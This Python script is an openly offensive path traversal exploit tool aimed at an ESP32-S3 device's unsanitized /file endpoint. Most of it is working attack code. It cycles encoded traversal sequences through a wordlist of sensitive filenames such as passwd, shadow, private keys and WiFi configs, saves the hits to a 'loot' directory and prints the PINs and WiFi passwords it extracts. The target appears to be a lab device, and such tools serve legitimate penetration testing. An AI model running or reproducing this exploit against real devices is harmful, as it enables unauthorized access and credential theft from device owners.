#!/usr/bin/env python3
"""
Path Traversal Exploit Tool

Automated path traversal testing against the /file endpoint of an ESP32-S3
device. Attempts to escape the /data/ web root using various traversal
sequences and a wordlist of common filenames to discover and extract
sensitive files (config, credentials, user databases).

The device's /file endpoint concatenates the 'name' parameter directly
into a file path without sanitization:
    String filepath = "/data/" + filename;

Using ../config resolves to /data/../config -> /config, exposing the
device configuration with plaintext PINs, WiFi credentials, and more.

Usage examples:

  # Run with built-in wordlist and default traversal techniques
  ./path_traverse.py

  # Target a specific device
  ./path_traverse.py --target http://10.0.0.50

  # Use an external wordlist file
  ./path_traverse.py --wordlist /usr/share/wordlists/common-files.txt

  # Save discovered files to a directory
  ./path_traverse.py --output-dir ./loot

  # Increase traversal depth
  ./path_traverse.py --depth 5

  # Only test specific filenames
  ./path_traverse.py --names config,users,passwd
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.error
import urllib.parse


DEFAULT_TARGET = "http://192.168.4.1"

# Built-in wordlist of common sensitive filenames in IoT devices
DEFAULT_WORDLIST = [
    # Configuration files
    "config",
    "configuration",
    "settings",
    "setup",
    "device.conf",
    "system.conf",
    "app.conf",
    # Credential files
    "users",
    "passwd",
    "password",
    "passwords",
    "shadow",
    "credentials",
    "accounts",
    "auth",
    "htpasswd",
    "secrets",
    # Network configuration
    "wifi",
    "wifi.conf",
    "network",
    "network.conf",
    "wpa_supplicant.conf",
    "interfaces",
    "hosts",
    "resolv.conf",
    # Keys and certificates
    "keys",
    "key",
    "private.key",
    "server.key",
    "server.pem",
    "cert.pem",
    "ca.pem",
    "jwt_secret",
    "api_key",
    "token",
    # Logs
    "logs",
    "log",
    "access.log",
    "error.log",
    "system.log",
    "debug.log",
    "audit.log",
    # Database files
    "db",
    "database",
    "data.db",
    "sqlite.db",
    "users.db",
    # Firmware and system
    "firmware",
    "version",
    "build",
    "manifest",
    "env",
    ".env",
    "backup",
    "dump",
    # ESP32 specific
    "nvs",
    "nvs_data",
    "partition",
    "bootloader",
    "ota_data",
    "spiffs",
]

# Traversal techniques to try
TRAVERSAL_SEQUENCES = {
    "basic": "../",
    "double-dot": "..../",
    "url-encoded": "%2e%2e%2f",
    "double-encoded": "%252e%252e%252f",
    "backslash": "..\\",
    "url-backslash": "..%5c",
    "mixed": "..%2f",
    "null-byte": "../",  # Will append %00 after filename
}

# Indicator strings that mean "file not found" (not a real hit)
NOT_FOUND_INDICATORS = [
    "File not found or access denied",
    "[File not found",
    "not found",
    "Available files in /data/",
]

# Indicator strings that suggest a real file was found
SUCCESS_INDICATORS = [
    "wifi_ssid=",
    "wifi_pass=",
    "user_pin=",
    "admin_pin=",
    "device_id=",
    "firmware_version=",
    "admin:",
    "user:",
    "# Device Configuration",
    "# User Database",
    "# Access Log",
]


def fetch_file(target, name, timeout=5):
    """Fetch a file from the /file endpoint with the given name parameter."""
    url = "{}/file?name={}".format(
        target.rstrip("/"), urllib.parse.quote(name, safe="")
    )

    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        return None, str(e)
    except Exception as e:
        return None, str(e)


def is_real_content(body):
    """Determine if the response contains real file content (not an error)."""
    for indicator in NOT_FOUND_INDICATORS:
        if indicator in body:
            return False
    for indicator in SUCCESS_INDICATORS:
        if indicator in body:
            return True
    # If it has a "--- File Content ---" header and content after it, probably real
    if "--- File Content ---" in body:
        parts = body.split("--- File Content ---", 1)
        if len(parts) > 1 and len(parts[1].strip()) > 10:
            # Check it is not just the error message
            content = parts[1].strip()
            for indicator in NOT_FOUND_INDICATORS:
                if indicator in content:
                    return False
            return True
    return False


def extract_content(body):
    """Extract the file content from the response body."""
    if "--- File Content ---" in body:
        parts = body.split("--- File Content ---", 1)
        if len(parts) > 1:
            return parts[1].strip()
    return body.strip()


def save_file(output_dir, name, content):
    """Save extracted file content to the output directory."""
    # Sanitize filename for local storage
    safe_name = name.replace("/", "_").replace("..", "dotdot").replace("\\", "_")
    safe_name = safe_name.strip("_")
    if not safe_name:
        safe_name = "unnamed"

    path = os.path.join(output_dir, safe_name)
    with open(path, "w") as f:
        f.write(content)
    return path


def test_traversal(target, filename, depth=3, techniques=None):
    """Test path traversal with various sequences and depths for a filename."""
    results = []

    if techniques is None:
        techniques = ["basic"]

    for technique_name in techniques:
        seq = TRAVERSAL_SEQUENCES.get(technique_name, "../")

        for d in range(1, depth + 1):
            traversal = seq * d
            if technique_name == "null-byte":
                name = "{}{}%00".format(traversal, filename)
            else:
                name = "{}{}".format(traversal, filename)

            status, body = fetch_file(target, name)

            if status is None:
                continue

            hit = is_real_content(body) if body else False

            results.append({
                "name": name,
                "technique": technique_name,
                "depth": d,
                "status": status,
                "hit": hit,
                "body": body,
            })

            if hit:
                # Found something - no need to try deeper depths for this technique
                break

    return results


def main():
    parser = argparse.ArgumentParser(
        description="Path traversal testing against the /file endpoint of an ESP32-S3 "
        "device. Attempts to escape the /data/ web root using ../ sequences "
        "and common filenames to discover config files, credentials, and "
        "user databases.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  # Quick scan with built-in wordlist
  %(prog)s

  # Target a specific device and save found files
  %(prog)s --target http://10.0.0.50 --output-dir ./loot

  # Use all traversal techniques
  %(prog)s --techniques basic,url-encoded,double-encoded,backslash

  # Test specific filenames only
  %(prog)s --names config,users,passwd,shadow

  # Use an external wordlist
  %(prog)s --wordlist /path/to/wordlist.txt --depth 5

  # Verbose output showing all attempts
  %(prog)s --verbose

traversal techniques:
  basic           ../             Standard dot-dot-slash
  double-dot      ..../           Double dot sequence
  url-encoded     %%2e%%2e%%2f      URL-encoded dots and slash
  double-encoded  %%252e%%252e%%252f  Double URL-encoded
  backslash       ..\\             Backslash separator (Windows)
  url-backslash   ..%%5c           URL-encoded backslash
  mixed           ..%%2f           Mixed encoding
  null-byte       ../%%00          Null byte truncation (legacy)
""",
    )

    parser.add_argument(
        "--target",
        "-t",
        default=DEFAULT_TARGET,
        metavar="URL",
        help="Device URL (default: {})".format(DEFAULT_TARGET),
    )
    parser.add_argument(
        "--wordlist",
        "-w",
        metavar="FILE",
        help="External wordlist file (one filename per line)",
    )
    parser.add_argument(
        "--names",
        "-n",
        metavar="LIST",
        help="Comma-separated list of filenames to test",
    )
    parser.add_argument(
        "--depth",
        "-d",
        type=int,
        default=3,
        metavar="N",
        help="Maximum traversal depth - number of ../ sequences (default: 3)",
    )
    parser.add_argument(
        "--techniques",
        metavar="LIST",
        default="basic",
        help="Comma-separated traversal techniques (default: basic). "
        "Use 'all' for all techniques.",
    )
    parser.add_argument(
        "--output-dir",
        "-o",
        metavar="DIR",
        help="Directory to save extracted files",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.1,
        metavar="SECS",
        help="Delay between requests in seconds (default: 0.1)",
    )
    parser.add_argument(
        "--verbose",
        "-v",
        action="store_true",
        help="Show all attempts, not just successful ones",
    )
    parser.add_argument(
        "--json",
        "-j",
        action="store_true",
        help="Output results as JSON",
    )

    args = parser.parse_args()

    # Build wordlist
    wordlist = []
    if args.names:
        wordlist = [n.strip() for n in args.names.split(",") if n.strip()]
    elif args.wordlist:
        if not os.path.isfile(args.wordlist):
            print("[!] Wordlist not found: {}".format(args.wordlist))
            sys.exit(1)
        with open(args.wordlist, "r") as f:
            wordlist = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        print("[*] Loaded {} filenames from {}".format(len(wordlist), args.wordlist))
    else:
        wordlist = DEFAULT_WORDLIST
        print("[*] Using built-in wordlist ({} filenames)".format(len(wordlist)))

    # Parse techniques
    if args.techniques == "all":
        techniques = list(TRAVERSAL_SEQUENCES.keys())
    else:
        techniques = [t.strip() for t in args.techniques.split(",")]
        for t in techniques:
            if t not in TRAVERSAL_SEQUENCES:
                print("[!] Unknown technique '{}'. Available: {}".format(
                    t, ", ".join(TRAVERSAL_SEQUENCES.keys())
                ))
                sys.exit(1)

    # Create output directory if needed
    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)
        print("[*] Saving extracted files to: {}".format(args.output_dir))

    # Verify device is reachable
    print("[*] Target: {}".format(args.target))
    print("[*] Testing {} filenames with {} technique(s), depth {}".format(
        len(wordlist), len(techniques), args.depth
    ))
    print()

    status, body = fetch_file(args.target, "logs.txt")
    if status is None:
        print("[!] Cannot reach device at {}".format(args.target))
        print("[!] Error: {}".format(body))
        sys.exit(1)
    print("[*] Device is reachable (baseline request returned HTTP {})".format(status))
    print()

    # Also test direct access (no traversal) as a baseline
    print("=" * 70)
    print("  PATH TRAVERSAL SCAN")
    print("  Target:     {}".format(args.target))
    print("  Wordlist:   {} filenames".format(len(wordlist)))
    print("  Techniques: {}".format(", ".join(techniques)))
    print("  Depth:      {}".format(args.depth))
    print("=" * 70)
    print()

    found_files = []
    tested = 0
    total = len(wordlist) * len(techniques) * args.depth

    for filename in wordlist:
        results = test_traversal(args.target, filename, args.depth, techniques)

        for r in results:
            tested += 1
            if r["hit"]:
                content = extract_content(r["body"])
                print("[+] FOUND: /file?name={}".format(r["name"]))
                print("    Technique: {}, Depth: {}".format(r["technique"], r["depth"]))
                print("    Content preview:")
                for line in content.splitlines()[:8]:
                    print("      {}".format(line))
                if len(content.splitlines()) > 8:
                    print("      ... ({} more lines)".format(
                        len(content.splitlines()) - 8
                    ))
                print()

                found_entry = {
                    "name": r["name"],
                    "filename": filename,
                    "technique": r["technique"],
                    "depth": r["depth"],
                    "content": content,
                }
                found_files.append(found_entry)

                # Save to disk if output directory specified
                if args.output_dir:
                    saved_path = save_file(args.output_dir, filename, content)
                    print("    Saved to: {}".format(saved_path))
                    print()

            elif args.verbose:
                print("[-] Miss: /file?name={} (HTTP {})".format(r["name"], r["status"]))

        if args.delay > 0:
            time.sleep(args.delay)

    # Summary
    print()
    print("=" * 70)
    print("  SCAN RESULTS")
    print("=" * 70)
    print("  Requests sent: {}".format(tested))
    print("  Files found:   {}".format(len(found_files)))
    print()

    if found_files:
        print("  Discovered files:")
        for f in found_files:
            print("    - {} (via {}, depth {})".format(
                f["filename"], f["technique"], f["depth"]
            ))

        # Highlight extracted credentials
        print()
        print("  Extracted credentials:")
        for f in found_files:
            content = f["content"]
            for line in content.splitlines():
                line = line.strip()
                if any(key in line for key in [
                    "user_pin=", "admin_pin=", "wifi_pass=",
                    "wifi_ssid=", "password", ":"
                ]):
                    if line.startswith("#"):
                        continue
                    print("    {}".format(line))
    else:
        print("  No files discovered through path traversal.")
        print("  Try increasing --depth or using --techniques all")

    print()
    print("=" * 70)

    # JSON output
    if args.json:
        output = {
            "target": args.target,
            "requests_sent": tested,
            "files_found": len(found_files),
            "results": [
                {
                    "filename": f["filename"],
                    "traversal_path": f["name"],
                    "technique": f["technique"],
                    "depth": f["depth"],
                    "content": f["content"],
                }
                for f in found_files
            ],
        }
        print()
        print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
